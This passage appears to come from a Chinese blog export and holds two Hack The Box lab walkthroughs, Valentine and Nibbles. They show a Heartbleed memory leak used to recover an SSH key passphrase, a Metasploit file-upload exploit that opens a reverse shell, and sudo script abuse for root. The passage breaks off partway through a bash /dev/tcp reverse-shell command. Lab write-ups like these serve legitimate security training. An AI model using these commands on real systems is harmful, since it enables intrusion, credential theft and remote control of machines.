49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d\n```\n这里拿到了一串二进制编码和一个提示\n\n提示中暗示我们可以解码这堆编码，那就去试试吧\n\n# 漏洞利用\n首先解密一下这堆编码\n\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel]\n└─# curl http://10.10.10.79/dev/hype_key|xxd -r -p\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  5383  100  5383    0     0  18954      0 --:--:-- --:--:-- --:--:-- 18887\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----\n```\n这里拿到了一个 ssh 私钥，根据文件格式，猜测出用户名是 hype，去尝试登录\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine]\n└─# ssh hype@10.10.10.79 -i id_rsa\nThe authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.\nECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nPermissions 0644 for 'id_rsa' are too open.\nIt is required that your private key files are NOT accessible by others.\nThis private key will be ignored.\nLoad key \"id_rsa\": bad permissions\nhype@10.10.10.79's password:\n```\n登录失败，再找找其他路子\n\n## 心脏滴血\n由于没有思路了，再回过头来看看之前的，看着首页的图片，似乎像是心脏滴血，去检测一下\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine]\n└─# nmap --script=ssl-heartbleed 10.10.10.79\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 02:59 EDT\nNmap scan report for 10.10.10.79\nHost is up (0.24s latency).\nNot shown: 997 closed ports\nPORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https\n| ssl-heartbleed: \n|   VULNERABLE:\n|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.\n|     State: VULNERABLE\n|     Risk factor: High\n|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.\n|           \n|     References:\n|       http://www.openssl.org/news/secadv_20140407.txt \n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160\n|_      http://cvedetails.com/cve/2014-0160/\n\nNmap done: 1 IP address (1 host up) scanned in 54.59 seconds\n```\n确实存在心脏滴血，那就去利用一下吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# searchsploit heartbleed                                                                          \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nOpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions)                                                                               | multiple/remote/32764.py\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)                                                                                                               | multiple/remote/32791.c\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (DTLS Support)                                                                                                | multiple/remote/32998.c\nOpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure                                                                                                                  | multiple/remote/32745.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Paper Title                                                                                                                                                                      |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nHeartBleed Attack - Paper                                                                                                                                                         | docs/english/49313-heartbleed-at\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n```\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine]\n└─# python exploit.py 10.10.10.79                                                                                                                                                                               1 ⨯\nConnecting...\nSending Client Hello...\nWaiting for Server Hello...\n ... received message: type = 22, ver = 0302, length = 66\n ... received message: type = 22, ver = 0302, length = 885\n ... received message: type = 22, ver = 0302, length = 331\n ... received message: type = 22, ver = 0302, length = 4\nSending heartbeat request...\n ... received message: type = 24, ver = 0302, length = 16384\nReceived heartbeat response:\n  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...\n  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......\n  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....\".\n  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.\n  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................\n  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.\n  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...\n  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............\n  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................\n  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.\n  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............\n  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................\n  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................\n  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.\n  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co\n  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl\n  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo\n  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C\n  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4\n  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc\n  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld\n  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D AA  mV0aGVoeXBlCg==.\n  0160: 3E 27 75 BB 3A EF D9 09 57 8D 5F D1 F7 08 99 48  >'u.:...W._....H\n  0170: 7F 80 41 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ..A.............\n```\n这里出来了一串密文\n\n```bash\naGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\n```\n然后使用之前我们找到的 /decode 来进行解密\n\n```bash\nYour input:\n\naGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==\n\nYour encoded input:\n\nheartbleedbelievethehype\n```\n得到了一个密码，再去登录试试\n\n别忘了加上权限\n\n```bash\nchmod 600 id_rsa\n```\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Valentine]\n└─# ssh hype@10.10.10.79 -i id_rsa\nEnter passphrase for key 'id_rsa': \nWelcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com/\n\nNew release '14.04.5 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\nLast login: Fri Feb 16 14:50:29 2018 from 10.10.14.3\nhype@Valentine:~$ whoami&&id\nhype\nuid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)\n```\n登录成功\n\n```bash\nhype@Valentine:~/Desktop$ cat user.txt \ne6710a5464769fd5fcd216e076961750\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n## Step 1\n```bash\nhype@Valentine:~/Desktop$ uname -a\nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux\n```\n我们可以看到这台机器版本很老，那肯定是存在脏牛的，在测试中也确实可以使用脏牛直接提权，大家可以自己测试一下\n\n## Step 2\n```bash\nhype@Valentine:~/Desktop$ history \n    1  exit\n    2  exot\n    3  exit\n    4  ls -la\n    5  cd /\n    6  ls -la\n    7  cd .devs\n    8  ls -la\n    9  tmux -L dev_sess \n   10  tmux a -t dev_sess \n   11  tmux --help\n   12  tmux -S /.devs/dev_sess \n   13  exit\n```\n查看历史命令，看到存在一个文件 /.devs/dev\\_sess 去查看一下\n\n```bash\nhype@Valentine:~/Desktop$ cd /.devs/\nhype@Valentine:/.devs$ ls -la\ntotal 8\ndrwxr-xr-x  2 root hype 4096 Apr 11 00:00 .\ndrwxr-xr-x 26 root root 4096 Feb  6  2018 ..\nsrw-rw----  1 root hype    0 Apr 11 00:00 dev_sess\nhype@Valentine:/.devs$ cat dev_sess \ncat: dev_sess: No such device or address\n```\n我们是无权限查看这个文件的，但是我们可以分析一下\n\n首先第 9 行使用 `-L` 运行了，然后第 10 行使用 `a -t` 运行了，然后第 11 行还查看了帮助，接着在第 12 行使用 `-S` 运行后，再运行了一个 `exit` ，那是不是意味着 `-S` 成功了呢？我们也去尝试一下\n\n```bash\nroot@Valentine:/# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功提权到 root 权限\n\n```bash\nroot@Valentine:~# cat root.txt \nf1bb6d759df1f272914ebbc9ed7765b2\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Nibbles - Hackthebox","url":"/2022/04/09/Hackthebox/Easy/Hackthebox-Nibbles/","content":"\n# Hackthebox - Nibbles\n# 靶场信息\n![](Hackthebox-Nibbles/5a43dfc9-2f82-4f83-9f71-0d3ce06119c8.png)\n\n# 靶场类型\n![](Hackthebox-Nibbles/f2f90e84-de15-4272-b261-14f07038866a.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.75\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-08 11:19 CST\nNmap scan report for 10.10.10.75\nHost is up (0.14s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/8%OT=22%CT=1%CU=33159%PV=Y%DS=2%DC=T%G=Y%TM=624FA9D0\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(\nOS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11\nOS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(\nOS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS\nOS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=\nOS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=\nOS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T\nOS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=\nOS:S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   139.27 ms 10.10.14.1\n2   139.49 ms 10.10.10.75\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 38.54 seconds\n```\n## Http\n![](Hackthebox-Nibbles/eeafe869-4542-42ec-b938-f7c7fdeab007.png)\n\n这台的 http 服务就这么点东西，也没什么用啊，根据靶机名字 `字节` ，去看一下源码吧\n\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Nibbles]\n└─# curl http://10.10.10.75/\n<b>Hello world!</b>\n\n<!-- /nibbleblog/ directory. Nothing interesting here! -->\n```\n这边可以看到，挂载了一个 /nibbleblog/ 目录\n\n![](Hackthebox-Nibbles/d00d3056-3248-47ab-89a5-98b8f83bdc18.png)\n\n这才是真实的主页\n\n可以看到是 Nibbleblog 搭建的，但是首页没什么东西，去fuzz一下\n\n## Fuzz\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel]\n└─# gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.75/nibbleblog/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/08 12:58:31 Starting gobuster in directory enumeration mode\n===============================================================\n/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]\n/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]\n/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]\n/README               (Status: 200) [Size: 4628]\n/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]\n/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]\n\n===============================================================\n2022/04/08 13:02:12 Finished\n===============================================================\n```\n这里可以看到有一个 README 文件\n\n![](Hackthebox-Nibbles/2d35fc2f-208c-41d4-9d3d-5d92e552ae85.png)\n\n通过 README 文件，首先我们知道了nibbleblog 使用的版本为 4.0.3\n\n```bash\n┌──(root💀lucifiel)-[/home/lucifiel]\n└─# curl http://10.10.10.75/nibbleblog/content/private/users.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<users><user username=\"admin\"><id type=\"integer\">0</id><session_fail_count type=\"integer\">0</session_fail_count><session_date type=\"integer\">1514544131</session_date></user><blacklist type=\"string\" ip=\"10.10.10.1\"><date type=\"integer\">1512964659</date><fail_count type=\"integer\">1</fail_count></blacklist></users>\n```\n```bash\n<users>\n<user username=\"admin\">\n<id type=\"integer\">0</id>\n<session_fail_count type=\"integer\">0</session_fail_count>\n<session_date type=\"integer\">1514544131</session_date>\n</user>\n<blacklist type=\"string\" ip=\"10.10.10.1\">\n<date type=\"integer\">1512964659</date>\n<fail_count type=\"integer\">1</fail_count>\n</blacklist>\n</users>\n```\n我们在 users.xml 中知道了管理员的用户名和 IP 地址\n\nhttp://10.10.10.75/nibbleblog/admin.php\n\n并且找到了一个登录点，但是我们没有密码，Nibbleblog 也没有默认密码，我们去尝试一下登录\n\n最后测试弱口令成功登录\n\n```bash\nusername = admin\npassword = nibbles\n```\n![](Hackthebox-Nibbles/50327381-af82-471b-adb0-d7f45744a57a.png)\n\n我们去搜索一下漏洞\n\n## Searchsploit\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Nibbles]\n└─# searchsploit Nibbleblog 4.0.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nNibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                             | php/remote/38489.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n```\n知道了 msf 有一个任意文件上传的漏洞\n\n# 漏洞利用\n```bash\nmsf6 exploit(multi/http/nibbleblog_file_upload) > show options\n\nModule options (exploit/multi/http/nibbleblog_file_upload):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASSWORD   nibbles          yes       The password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.10.75      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit\n   RPORT      80               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /nibbleblog/     yes       The base path to the web application\n   USERNAME   admin            yes       The username to authenticate with\n   VHOST                       no        HTTP server virtual host\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.9       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Nibbleblog 4.0.3\n```\n设置好相关的参数，然后 exploit 执行\n\n```bash\nmsf6 exploit(multi/http/nibbleblog_file_upload) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.9:4444\n[*] Sending stage (39282 bytes) to 10.10.10.75\n[+] Deleted image.php\n[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.75:41138) at 2022-04-08 13:24:32 +0800\n\nmeterpreter > getuid\nServer username: nibbler (1001)\n```\n成功拿到一个 shell\n\n```bash\nshell\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\n```\n按照这些流程获取一个交互式 shell\n\n```bash\nnibbler@Nibbles:/home/nibbler$ cat /home/nibbler/user.txt\ne8c44981255d5ccfaba9f1e2c343b6a1\n```\n成功获得 user 权限的 flag 文件\n\n# 权限提升\n```bash\nnibbler@Nibbles:/home/nibbler$ sudo -l\nMatching Defaults entries for nibbler on Nibbles:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n```\n使用 sudo -l 发现一个 sh 脚本可以用 root 权限执行\n\n```bash\nnibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh\ncat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory\n```\n查看显示没有这个文件，去浏览一下\n\n```bash\nnibbler@Nibbles:/home/nibbler$ ls -la\ntotal 20\ndrwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .\ndrwxr-xr-x 3 root    root    4096 Dec 10  2017 ..\n-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history\ndrwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano\n-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip\n-r-------- 1 nibbler nibbler   33 Apr  8 01:20 user.txt\n```\n是一个压缩包，去自己解压出来\n\n```bash\nnibbler@Nibbles:/home/nibbler$ unzip personal.zip\nArchive:  personal.zip\n   creating: personal/\n   creating: personal/stuff/\n  inflating: personal/stuff/monitor.sh\n```\n然后再去查看一下\n\n```bash\nnibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh\n                  ####################################################################################################\n                  #                                        Tecmint_monitor.sh                                        #\n                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #\n                  # If any bug, report us in the link below                                                          #\n                  # Free to use/edit/distribute the code below by                                                    #\n                  # giving proper credit to Tecmint.com and Author                                                   #\n                  #                                                                                                  #\n                  ####################################################################################################\n#! /bin/bash\n# unset any variable which system may be using\n\n# clear the screen\nclear\n\nunset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage\n\nwhile getopts iv name\ndo\n        case $name in\n          i)iopt=1;;\n          v)vopt=1;;\n          *)echo \"Invalid arg\";;\n        esac\ndone\n\nif [[ ! -z $iopt ]]\nthen\n{\nwd=$(pwd)\nbasename \"$(test -L \"$0\" && readlink \"$0\" || echo \"$0\")\" > /tmp/scriptname\nscriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)\nsu -c \"cp $scriptname /usr/bin/monitor\" root && echo \"Congratulations! Script Installed, now run monitor Command\" || echo \"Installation failed\"\n}\nfi\n\nif [[ ! -z $vopt ]]\nthen\n{\necho -e \"tecmint_monitor version 0.1\\nDesigned by Tecmint.com\\nReleased Under Apache 2.0 License\"\n}\nfi\n\nif [[ $# -eq 0 ]]\nthen\n{\n\n# Define Variable tecreset\ntecreset=$(tput sgr0)\n\n# Check if connected to Internet or not\nping -c 1 google.com &> /dev/null && echo -e '\\E[32m'\"Internet: $tecreset Connected\" || echo -e '\\E[32m'\"Internet: $tecreset Disconnected\"\n\n# Check OS Type\nos=$(uname -o)\necho -e '\\E[32m'\"Operating System Type :\" $tecreset $os\n\n# Check OS Release Version and Name\ncat /etc/os-release | grep 'NAME\\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease\necho -n -e '\\E[32m'\"OS Name :\" $tecreset  && cat /tmp/osrelease | grep -v \"VERSION\" | cut -f2 -d\\\"\necho -n -e '\\E[32m'\"OS Version :\" $tecreset && cat /tmp/osrelease | grep -v \"NAME\" | cut -f2 -d\\\"\n\n# Check Architecture\narchitecture=$(uname -m)\necho -e '\\E[32m'\"Architecture :\" $tecreset $architecture\n\n# Check Kernel Release\nkernelrelease=$(uname -r)\necho -e '\\E[32m'\"Kernel Release :\" $tecreset $kernelrelease\n\n# Check hostname\necho -e '\\E[32m'\"Hostname :\" $tecreset $HOSTNAME\n\n# Check Internal IP\ninternalip=$(hostname -I)\necho -e '\\E[32m'\"Internal IP :\" $tecreset $internalip\n\n# Check External IP\nexternalip=$(curl -s ipecho.net/plain;echo)\necho -e '\\E[32m'\"External IP : $tecreset \"$externalip\n\n# Check DNS\nnameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')\necho -e '\\E[32m'\"Name Servers :\" $tecreset $nameservers\n\n# Check Logged In Users\nwho>/tmp/who\necho -e '\\E[32m'\"Logged In users :\" $tecreset && cat /tmp/who\n\n# Check RAM and SWAP Usages\nfree -h | grep -v + > /tmp/ramcache\necho -e '\\E[32m'\"Ram Usages :\" $tecreset\ncat /tmp/ramcache | grep -v \"Swap\"\necho -e '\\E[32m'\"Swap Usages :\" $tecreset\ncat /tmp/ramcache | grep -v \"Mem\"\n\n# Check Disk Usages\ndf -h| grep 'Filesystem\\|/dev/sda*' > /tmp/diskusage\necho -e '\\E[32m'\"Disk Usages :\" $tecreset\ncat /tmp/diskusage\n\n# Check Load Average\nloadaverage=$(top -n 1 -b | grep \"load average:\" | awk '{print $10 $11 $12}')\necho -e '\\E[32m'\"Load Average :\" $tecreset $loadaverage\n\n# Check System Uptime\ntecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)\necho -e '\\E[32m'\"System Uptime Days/(HH:MM) :\" $tecreset $tecuptime\n\n# Unset Variables\nunset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage\n\n# Remove Temporary Files\nrm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage\n}\nfi\nshift $(($OPTIND -1))\n```\n我们查看一下这个文件的权限组\n\n```bash\nnibbler@Nibbles:/home/nibbler$ ls -la /home/nibbler/personal/stuff/monitor.sh\n-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 /home/nibbler/personal/stuff/monitor.sh\n```\n777 权限，那就简单了，写入一段查看 flag 的语句然后执行\n\n```bash\nnibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'cat /root/root.txt' > monitor.sh\nnibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh\n48716e5e4fa73411376fb8ee5f037bed\n```\n成功拿到 root 权限的 flag 文件\n\n如果我们向拿到 root 权限的 shell，那就去写入一个反弹语句\n\n使用 nc 监听一个端口\n\n```bash\nnc -nvlp 5555\n```\n```bash\necho '/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.9/5555 0>&1\"' > 